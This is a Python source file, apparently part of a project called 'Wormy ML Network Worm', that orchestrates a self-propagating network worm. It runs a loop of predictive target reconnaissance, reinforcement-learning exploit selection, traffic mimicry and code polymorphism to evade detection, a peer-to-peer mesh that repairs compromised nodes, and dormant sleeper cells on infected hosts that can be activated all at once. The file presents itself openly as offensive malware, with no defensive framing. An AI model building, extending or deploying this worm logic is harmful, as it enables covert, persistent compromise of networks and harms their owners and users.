"""
Wormy ML Network Worm v3.0 — The Adaptive Cycle
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Adaptive Cycle Orchestrator
Integrates all 6 APT-level components into a self-adaptive propagation system:

1. Predictive Reconnaissance → Bayesian neighborhood analysis
2. Adaptive Exploit Selection → RL-based with Thompson Sampling
3. Distributed Redundancy → P2P healing mesh
4. Traffic Mimicry → Protocol tunneling
5. Semantic Polymorphism → AST-based code transformation
6. Dormant Cells → Staged loading with sleeper agents

This replaces the linear flow with a feedback loop:
Recon → Predict → Exploit → Learn → Heal → Mimic → Mutate → Sleep → Repeat
"""

import json
import os
import sys
import time
from datetime import datetime
from typing import Dict, List, Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.distributed_redundancy import DistributedRedundancy, HeartbeatProtocol
from core.dormant_cells import DormantCellManager

# Import all APT-level components
from core.predictive_recon import BayesianNetworkAnalyzer, PredictiveScanner
from evasion.semantic_polymorphism import SemanticPolymorphicEngine
from evasion.traffic_mimicry import TrafficMimicryEngine
from exploits.adaptive_exploit_selector import AdaptiveExploitSelector
from utils.logger import logger


class AdaptiveCycle:
    """
    The Adaptive Cycle — APT-level autonomous propagation

    Replaces linear propagation with a self-adaptive feedback loop:

    Phase 1: PREDICT — Bayesian analysis predicts where high-value targets are
    Phase 2: SELECT — RL-based exploit selector picks the best attack
    Phase 3: EXPLOIT — Execute with traffic mimicry and semantic polymorphism
    Phase 4: LEARN — Update exploit effectiveness based on results
    Phase 5: HEAL — Distributed redundancy repairs compromised peers
    Phase 6: DORMANT — Deploy sleeper cells for future activation
    """

    def __init__(self, host_ip: str, host_id: str = ""):
        self.host_ip = host_ip
        self.host_id = host_id or "wormy_main"

        # Initialize all APT components
        self.predictive_scanner = PredictiveScanner()
        self.exploit_selector = AdaptiveExploitSelector()
        self.distributed_redundancy = DistributedRedundancy(host_ip, host_id)
        self.traffic_mimicry = TrafficMimicryEngine()
        self.semantic_polymorphism = SemanticPolymorphicEngine()
        self.dormant_cells = DormantCellManager()

        # Cycle tracking
        self.cycle_count = 0
        self.cycle_log: List[Dict] = []

        logger.info("=" * 60)
        logger.info("ADAPTIVE CYCLE INITIALIZED (APT-Level)")
        logger.info("=" * 60)
        logger.info(f"  Host: {host_ip} ({host_id})")
        logger.info(f"  Components: Predictive Recon, Adaptive Exploit,")
        logger.info(f"    Distributed Redundancy, Traffic Mimicry,")
        logger.info(f"    Semantic Polymorphism, Dormant Cells")
        logger.info("=" * 60)

    def run_cycle(
        self,
        scan_results: List[Dict],
        exploit_results: Dict = None,
        available_exploits: List[str] = None,
    ) -> Dict:
        """
        Execute one complete Adaptive Cycle

        Args:
            scan_results: List of discovered hosts with ports/services
            exploit_results: Results from previous exploitation attempts
            available_exploits: List of applicable exploit names

        Returns:
            Cycle results with recommendations
        """
        self.cycle_count += 1
        cycle_start = time.time()
        cycle_results = {
            "cycle": self.cycle_count,
            "phase_results": {},
            "recommendations": [],
        }

        logger.info(f"\n{'=' * 60}")
        logger.info(f"ADAPTIVE CYCLE #{self.cycle_count}")
        logger.info(f"{'=' * 60}")

        # Phase 1: PREDICT — Bayesian reconnaissance
        logger.info("Phase 1: PREDICTIVE RECONNAISSANCE")
        for host in scan_results:
            self.predictive_scanner.analyze_and_prioritize(
                host["ip"],
                host.get("open_ports", []),
                host.get("os_guess", "Unknown"),
            )

        priority_targets = self.predictive_scanner.get_next_targets(10)
        subnet_priorities = self.predictive_scanner.analyzer.get_subnet_priority()
        cycle_results["phase_results"]["predict"] = {
            "priority_targets": priority_targets,
            "subnet_priorities": subnet_priorities[:5],
        }

        if priority_targets:
            logger.info(
                f"  Top predicted target: {priority_targets[0][0]} (score: {priority_targets[0][1]:.2f})"
            )
            cycle_results["recommendations"].append(
                f"Prioritize scanning {priority_targets[0][0]} (predicted high-value)"
            )

        # Phase 2: SELECT — Adaptive exploit selection
        if exploit_results and available_exploits:
            logger.info("Phase 2: ADAPTIVE EXPLOIT SELECTION")
            for target_ip, result in exploit_results.items():
                os_type = result.get("os", "Unknown")
                services = result.get("services", [])

                # Update selector with results
                self.exploit_selector.update_reward(
                    os_type,
                    services,
                    result.get("exploit", ""),
                    result.get("success", False),
                    result.get("reward", 0),
                    result.get("detected", False),
                )

                # Get ranking for next attempt
                ranking = self.exploit_selector.get_exploit_ranking(os_type, services)
                if ranking:
                    logger.info(
                        f"  Best exploit for {target_ip}: {ranking[0][0]} (score: {ranking[0][1]:.2f})"
                    )

            trends = self.exploit_selector.detect_trends()
            cycle_results["phase_results"]["select"] = {
                "trends": trends,
                "ranking": ranking[:5] if ranking else [],
            }

            if trends.get("trend") == "decreasing":
                cycle_results["recommendations"].append(
                    "Exploit effectiveness decreasing — targets may be patched"
                )

        # Phase 3: EXPLOIT — Traffic mimicry + semantic polymorphism
        logger.info("Phase 3: EXPLOIT WITH MIMICRY + POLYMORPHISM")
        active_protocol = self.traffic_mimicry.select_protocol()
        timing = self.traffic_mimicry.get_timing(active_protocol)
        packet_range = self.traffic_mimicry.get_packet_size(active_protocol)

        cycle_results["phase_results"]["exploit"] = {
            "mimicry_protocol": active_protocol,
            "timing_interval": timing,
            "packet_size_range": packet_range,
        }
        logger.info(f"  Traffic mimicry: {active_protocol} (interval: {timing:.1f}s)")

        # Phase 4: HEAL — Distributed redundancy check
        logger.info("Phase 4: DISTRIBUTED REDUNDANCY CHECK")
        mesh_status = self.distributed_redundancy.get_mesh_status()
        cycle_results["phase_results"]["heal"] = mesh_status
        logger.info(
            f"  Mesh: {mesh_status['heartbeat']['active_peers']} active, "
            f"{mesh_status['heartbeat']['dead_peers']} dead"
        )

        # Phase 5: DORMANT — Deploy sleeper cells
        logger.info("Phase 5: DORMANT CELL DEPLOYMENT")
        cell_stats = self.dormant_cells.get_statistics()
        cycle_results["phase_results"]["dormant"] = cell_stats
        logger.info(f"  Cells: {cell_stats['dormant']} dormant, {cell_stats['active']} active")

        # Cycle timing
        cycle_elapsed = time.time() - cycle_start
        cycle_results["cycle_time"] = cycle_elapsed
        cycle_results["timestamp"] = datetime.now().isoformat()

        self.cycle_log.append(cycle_results)

        logger.info(f"\nCycle #{self.cycle_count} completed in {cycle_elapsed:.2f}s")
        logger.info(f"Recommendations: {len(cycle_results['recommendations'])}")
        for rec in cycle_results["recommendations"]:
            logger.info(f"  → {rec}")

        return cycle_results

    def deploy_dormant_cell(self, host_ip: str, max_dormant_days: int = 30) -> str:
        """Deploy a dormant cell to a target host"""
        cell_id = self.dormant_cells.deploy_cell(
            host_ip,
            max_dormant_days=max_dormant_days,
        )
        return cell_id

    def activate_all_cells(self) -> List[str]:
        """Activate all dormant cells simultaneously"""
        return self.dormant_cells.activate_all()

    def get_full_status(self) -> Dict:
        """Get complete adaptive cycle status"""
        return {
            "cycle_count": self.cycle_count,
            "predictive_recon": self.predictive_scanner.analyzer.get_statistics(),
            "exploit_selector": self.exploit_selector.get_statistics(),
            "distributed_redundancy": self.distributed_redundancy.get_mesh_status(),
            "traffic_mimicry": self.traffic_mimicry.get_statistics(),
            "semantic_polymorphism": self.semantic_polymorphism.get_statistics(),
            "dormant_cells": self.dormant_cells.get_statistics(),
            "recent_cycles": len(self.cycle_log),
        }
